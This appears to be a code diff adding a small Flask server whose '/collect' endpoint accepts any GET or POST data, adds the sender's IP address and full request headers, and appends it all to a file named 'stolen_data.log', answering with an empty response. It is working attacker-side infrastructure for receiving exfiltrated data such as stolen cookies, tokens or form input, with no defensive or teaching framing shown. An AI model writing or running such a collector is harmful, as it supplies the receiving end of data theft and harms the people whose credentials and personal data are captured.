@@ -1,1 +1,42 @@
+from flask import Flask, request, jsonify
+import json
+import os
+from datetime import datetime
 
+app = Flask(__name__)
+
+LOG_FILE = "stolen_data.log"
+
+@app.route('/collect', methods=['GET', 'POST'])
+def collect():
+    if request.method == 'POST':
+        data = request.get_json() or request.form.to_dict()
+        if not data and request.data:
+            try:
+                data = json.loads(request.data)
+            except:
+                data = {'raw': request.data.decode('utf-8')}
+    
+    if request.method == 'GET':
+        data = request.args.to_dict()
+    
+    # Add IP and request info
+    data['remote_ip'] = request.remote_addr
+    data['request_headers'] = dict(request.headers)
+    
+    # Log to file
+    with open(LOG_FILE, 'a') as f:
+        f.write(f"\n{'='*60}\n")
+        f.write(f"Timestamp: {datetime.now().isoformat()}\n")
+        f.write(f"IP: {request.remote_addr}\n")
+        f.write(f"Data: {json.dumps(data, indent=2)}\n")
+        f.write(f"{'='*60}\n")
+    
+    # Also print to console
+    print(f"[{datetime.now()}] Received data from {request.remote_addr}")
+    print(json.dumps(data, indent=2))
+    
+    return '', 204  # No content response
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080, debug=False)
